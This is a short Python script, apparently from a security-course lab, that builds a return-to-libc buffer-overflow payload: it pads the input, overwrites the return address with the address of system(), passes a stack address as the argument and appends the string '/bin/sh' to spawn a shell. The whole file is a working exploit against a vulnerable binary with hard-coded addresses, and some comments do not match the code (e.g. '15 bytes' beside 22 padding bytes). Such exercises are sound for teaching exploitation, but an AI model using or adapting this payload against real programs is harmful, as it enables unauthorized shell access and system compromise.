from shellcode import shellcode
from struct import pack 
import sys

vuln_bytes = b'/bin/sh' #comand to execute in system('/bin/sh') (7 bytes)
#vuln_bytes = b'hs/nib/'
# reversed_vuln_cmd = pack("<I", vuln_bytes)

return_address = pack("<I", 0x80518d0) #call system function

param_for_system = pack("<I", 0xfffe9cdc) # beginning of buffer (shellcode)

bs_str = 'l'*22 #15 bytes till RA
bs_bytes = bytes(bs_str, 'utf-8')
more_bs_str = 'l'*36 # bytes till param want to overwrite
more_bs_bytes = bytes(more_bs_str, 'utf-8') 


payload = bs_bytes  + return_address  + param_for_system + param_for_system + more_bs_bytes + vuln_bytes 
sys.stdout.buffer.write(payload)  